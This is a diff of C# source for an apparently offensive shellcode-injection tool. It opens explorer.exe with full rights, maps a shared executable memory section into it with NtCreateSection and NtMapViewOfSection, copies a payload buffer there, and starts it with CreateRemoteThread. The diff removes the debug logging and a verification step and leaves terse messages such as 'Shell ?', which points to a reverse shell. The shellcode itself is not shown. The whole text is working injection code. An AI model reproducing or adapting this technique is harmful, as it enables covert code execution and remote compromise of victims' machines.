@@ -85,29 +85,24 @@ namespace RSjectLowlevel
         uint uLen = (uint)len;
 
         IntPtr lHandle = Process.GetCurrentProcess().Handle;
-        Console.WriteLine($"Got handle {lHandle} on local process.");
 
         string targetedProc = "explorer"; 
         int procId = Process.GetProcessesByName(targetedProc).First().Id;
 
         IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
-        Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");
 
         IntPtr sHandle = new IntPtr();
         long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
-        Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");
 
         IntPtr baseAddrL = new IntPtr();
         uint viewSizeL = uLen;
         ulong sectionOffsetL = new ulong();
         long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);
-        Console.WriteLine($"Mapped local memory section with base address {baseAddrL} (viewsize: {viewSizeL}, offset: {sectionOffsetL}). Success: {mStatusL == 0}.");
 
         IntPtr baseAddrR = new IntPtr();
         uint viewSizeR = uLen;
         ulong sectionOffsetR = new ulong();
         long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);
-        Console.WriteLine($"Mapped remote memory section with base address {baseAddrR} (viewsize: {viewSizeR}, offset: {sectionOffsetR}). Success: {mStatusR == 0}.");
 
         for (int i = 0; i < buf.Length; i++)
         {
@@ -115,37 +110,23 @@ namespace RSjectLowlevel
         }
 
         Marshal.Copy(buf, 0, baseAddrL, len);
-        Console.WriteLine($"Copied shellcode to locally mapped memory at address {baseAddrL}.");
 
         byte[] remoteMemory = new byte[len];
         IntPtr noBytesRead = new IntPtr();
         bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
-        bool sameSame = ByteArrayCompare(buf, remoteMemory);
-        Console.WriteLine($"DEBUG: Checking if shellcode is correctly placed remotely...");
-        if (sameSame != true)
-        {
-            Console.WriteLine("DEBUG: NOT THE SAME! ABORTING EXECUTION.");
-            return;
-        }
-        else
-        {
-            Console.WriteLine("DEBUG: OK.");
-        }
 
         if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
         {
-            Console.WriteLine("Injection done! Check your listener!");
+            Console.WriteLine("Shell ?");
         }
         else
         {
-            Console.WriteLine("Injection failed!");
+            Console.WriteLine("Nope!");
         }
 
         uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
-        Console.WriteLine($"Unmapped local memory section. Success: {uStatusL == 0}.");
 
         int clStatus = NtClose(sHandle);
-        Console.WriteLine($"Closed memory section. Success: {clStatus == 0}.");
     }
 }
 }
